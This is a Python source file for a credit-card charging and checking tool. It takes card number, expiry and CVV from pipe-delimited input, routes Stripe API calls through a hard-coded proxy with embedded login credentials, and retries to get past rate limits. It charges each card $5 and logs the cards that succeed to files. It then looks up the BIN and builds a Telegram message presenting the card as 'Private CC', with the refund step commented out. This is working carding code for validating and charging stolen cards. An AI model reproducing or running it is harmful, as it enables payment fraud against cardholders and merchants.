import requests
import time
import uuid


def charge(cc, sktxt, cvv1):

    proxies = {
        "http": "http://zloWF8TVtH:ZqnGipgz9u@proxies.instaproxy.io:4678",
        "https": "http://zloWF8TVtH:ZqnGipgz9u@proxies.instaproxy.io:4678"
    }

    sk = {'Authorization': f'Bearer {sktxt}',
          'Idempotency-Key': str(uuid.uuid4())}

    card_number = cc.split('|')[0]
    exp_month = cc.split('|')[1]
    exp_year = cc.split('|')[2]
    cvv = cc.split('|')[3].split(' ')[0]

    st = time.perf_counter()

    data = {
        "type": "card",
        "card[number]": card_number,
        "card[exp_month]": exp_month,
        "card[exp_year]": exp_year
    }

    if cvv1:
        data["card[cvc]"] = cvv

    bypassing = 0

    try:

        token = requests.post(
            'https://api.stripe.com/v1/payment_methods', data=data, headers=sk)
        # print(token.text)
        while 'rate_limit' in token.text or 'rate limit' in token.text:
            bypassing += 1
            token = requests.post(
                'https://api.stripe.com/v1/payment_methods', data=data, headers=sk)
        tok = token.json()['id']

    except Exception as s:

        et = end_time = time.perf_counter()

        total = str(round(et-st, 1))
        reason = token.json()['error']['message']

        try:
            code = charge.json()['error']['decline_code']
        except:
            code = 'idk'

        resp = {'cc': cc,
                'resp': reason,
                'code': code,
                'time': total,
                'bypass': bypassing
                }

    else:

        sk = {'Authorization': f'Bearer {sktxt}',
              'Idempotency-Key': str(uuid.uuid4())}

        try:
            data = {
                "address[country]": "Us",
                "address[city]": "mumbai",
                "address[line1]": "1 ok st",
                "address[line2]": "apt 3",
                "address[postal_code]": "444444",
                "address[state]": "MH",
                "description": "ok",
                "name": "o ok k",
                "payment_method": tok
            }
            charge = requests.post(
                'https://api.stripe.com/v1/customers', data=data, headers=sk)
            while 'rate_limit' in charge.text or 'rate limit' in charge.text:
                bypassing += 1
                charge = requests.post(
                    'https://api.stripe.com/v1/customers', data=data, headers=sk)
            cus = charge.json()['id']

        except Exception as s:

            et = end_time = time.perf_counter()

            total = str(round(et-st, 1))
            reason = charge.json()['error']['message']

            try:
                code = charge.json()['error']['decline_code']
            except:
                code = 'idk'

            resp = {'cc': cc,
                    'resp': reason,
                    'code': code,
                    'time': total,
                    'bypass': bypassing
                    }
        else:

            data = {
                "amount": "500",
                "currency": "usd",
                "description": "ok",
                "customer": cus
            }

            sk = {'Authorization': f'Bearer {sktxt}',
                  'Idempotency-Key': str(uuid.uuid4())}

            charge = requests.post(
                'https://api.stripe.com/v1/payment_intents', data=data, headers=sk)
            while 'rate_limit' in charge.text or 'rate limit' in charge.text:
                bypassing += 1
                charge = requests.post(
                    'https://api.stripe.com/v1/payment_intents', data=data, headers=sk)

            # print(charge.text)

            pid = charge.json()['id']
            pis = charge.json()['client_secret']

            sk = {'Authorization': f'Bearer {sktxt}',
                  'Idempotency-Key': str(uuid.uuid4())}

            data = {
                "payment_method": tok,
                "off_session": True
            }

            charge = requests.post(
                f'https://api.stripe.com/v1/payment_intents/{pid}/confirm', data=data, headers=sk)

            et = end_time = time.perf_counter()

            total = str(round(et-st, 1))

            while 'rate_limit' in charge.text or 'rate limit' in charge.text:
                bypassing += 1
                charge = requests.post(
                    f'https://api.stripe.com/v1/payment_intents/{pid}/confirm', data=data, headers=sk)

            # input(charge.text)

            if 'succeeded' in charge.text:
                # sk={'Authorization': f'Bearer {sktxt}', 'Idempotency-Key': str(uuid.uuid4())}

                # data={
                # "charge": charge.json()['id']
                # }
                # refund=requests.post('https://api.stripe.com/v1/refunds',data=data,headers=sk).text

                resp = {'cc': cc,
                        'resp': r'Payment Complete: Charged -$5.00',
                        'code': 'Charged',
                        'time': total,
                        'bypass': bypassing
                        }
                receipt = charge.json()['charges']['data'][0]['receipt_url']
                cvvchk = charge.json()[
                    'charges']['data'][0]['payment_method_details']['card']['checks']['cvc_check'].upper()

                open('charged.txt', 'a').write(f'{cc} | {charge.text}\n')
                req = bindata(card_number[:6])
                try:
                    brand = req['brand']
                except:
                    brand = 'None'
                try:
                    country = req['country']
                except:
                    country = 'None'
                try:
                    country_flag = req['country_flag']
                except:
                    country_flag = 'None'
                try:
                    bank = req['bank']
                except:
                    bank = 'None'
                try:
                    level = req['level']
                except:
                    level = 'None'
                try:
                    typebin = req['type']
                except:
                    typebin = 'None'
                resptg = f'''<b><i>✅ Stripe Charged CC [-$5.00]</i></b>

<b><i>Private CC 🔐</i></b>
<b><i>Card Number:</i></b> <code>{card_number}</code>
<b><i>Expiration:</i></b> <b>{exp_month}/{exp_year}</b>
<b><i>CVV [{cvvchk}]:</i></b> <b><span class="tg-spoiler">{cvv}</span></b>

<b><i>BIN Info:</i></b>
<i>Country:</i> <b>{country} {country_flag}</b>
<i>Brand:</i> <b>{brand}</b>
<i>Bank:</i> <b>{bank}</b>
<i>Level:</i> <b>{level}</b>
<i>Type:</i> <b>{typebin}</b>
'''.replace('\n', '%0A')

            elif charge.status_code == 402:

                reason = charge.json()['error']['message']

                try:
                    code = charge.json()['error']['decline_code']
                except:
                    code = charge.json()['error']['code']

                if 'transaction_not_allowed' in charge.text or 'incorrect_cvc' in charge.text or 'invalid_cvc' in charge.text or 'insufficient_funds' in charge.text:

                    resp = {'cc': cc,
                            'resp': reason,
                            'code': code,
                            'time': total,
                            'bypass': bypassing
                            }
                    open('ccn.txt', 'a').write(f"{resp}\n")
                else:
                    resp = {'cc': cc,
                            'resp': reason,
                            'code': code,
                            'time': total,
                            'bypass': bypassing
                            }

            elif 'requires_action' in charge.text:

                resp = {'cc': cc,
                        'resp': '3DS Required ',
                        'code': 'requires_action',
                        'time': total,
                        'bypass': bypassing
                        }
            else:

                resp = {'cc': cc,
                        'resp': charge.text,
                        'code': 'Unknown Error',
                        'time': total,
                        'bypass': bypassing
                        }

    return resp


def bindata(bincc):
    resp = requests.get(f'https://bins.antipublic.cc/bins/{bincc}')
    resp = resp.json()
    return resp
